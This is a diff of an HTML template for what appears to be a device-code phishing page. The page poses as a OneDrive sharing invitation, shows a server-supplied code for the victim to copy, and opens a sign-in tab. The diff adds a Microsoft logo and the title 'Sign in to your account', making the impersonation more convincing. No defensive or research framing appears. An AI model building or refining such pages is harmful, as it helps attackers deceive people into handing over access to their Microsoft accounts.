@@ -4,23 +4,20 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
-    <title>Login</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css">
-    <link rel="stylesheet" href="https://maxcdn.icons8.com/fonts/line-awesome/1.1/css/line-awesome.min.css">
-    <link rel="stylesheet" href="assets/css/styles.min.css">
+    <title>Sign in to your account</title>
+    <link rel="stylesheet" href="/assets/css/styles.min.css">
 </head>
 
 <body style="width: 100%; min-height: 100vh;">
     <div id="loginForm" class="container">
-        <img width="150" id="image" src="assets/img/logo.png" alt="">
+        <img id="image" class="logo" src="/assets/img/microsoft-logo.svg" alt="Microsoft" width="108" height="24">
         <section id="section-main">
             <section id="section-1" class="slide-page">
                 <p id="signIn" class="field">Invitation for OneDrive</p>
                 <p id="NoAccount" class="field">Use this code to access the shared resources.<br>Click Next to copy your code and open sign-in in a new tab.<br>You can return here anytime to view the code again.</p>
                 <div id="codeRow" class="field">
                     <input type="text" id="email" value="<%= user_code %>" readonly>
-                    <img src="assets/img/copy-icon.webp" alt="Copy code" onclick="copy()">
+                    <img src="/assets/img/copy-icon.webp" alt="Copy code" onclick="copy()">
                 </div>
                 <p id="btnPlace" class="field">
                     <button onclick="openDeviceLogin()" class="firstNext next" type="button" id="btnSend">Next</button>
